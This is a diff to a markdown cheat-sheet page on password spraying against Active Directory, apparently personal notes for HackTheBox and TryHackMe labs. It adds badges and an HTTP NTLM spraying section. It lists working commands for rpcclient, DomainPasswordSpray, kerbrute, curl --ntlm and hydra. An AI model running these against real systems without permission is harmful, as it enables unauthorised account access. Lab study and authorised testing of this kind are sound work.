@@ -1,6 +1,7 @@
 # Password spraying
 
 [![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+[![breachingad](../../../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
 [![passwordattacks](../../../../_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)
 
 <div class="row row-cols-lg-2"><div>
@@ -52,6 +53,8 @@ $ for u in $(cat wordlist);do rpcclient -U "$u%PasswordHere" -c "getusername;qui
 
 #### Leveraging A Domain-joined Host
 
+[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
 You may use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) <small>(1.6k ⭐)</small>:
 
 ```ps
@@ -61,11 +64,35 @@ PS> Invoke-DomainPasswordSpray -Password PasswordHere -OutFile output.txt -Error
 
 #### Leveraging Kerberos Authentication Module
 
+[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
 We can use [kerbrute](/cybersecurity/red-team/tools/utilities/windows/kerbrute.md):
 
 ```ps
 $ kerbrute passwordspray -d domain --dc IP valid_users.txt mypassword
 ```
+</div></div>
+
+<hr class="sep-both">
+
+## HTTP LDAP Credentials Password spraying
+
+[![breachingad](../../../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
+
+<div class="row row-cols-lg-2"><div>
+
+We can use `curl` to test a pair of credentials:
+
+```ps
+$ curl URL -u "username:password" --ntlm
+```
+
+We can also use tools such as hydra:
+
+```ps
+$ hydra -L usernames.txt -p password example.com http-get
+```
+</div><div>
 </div></div>
 
 <hr class="sep-both">
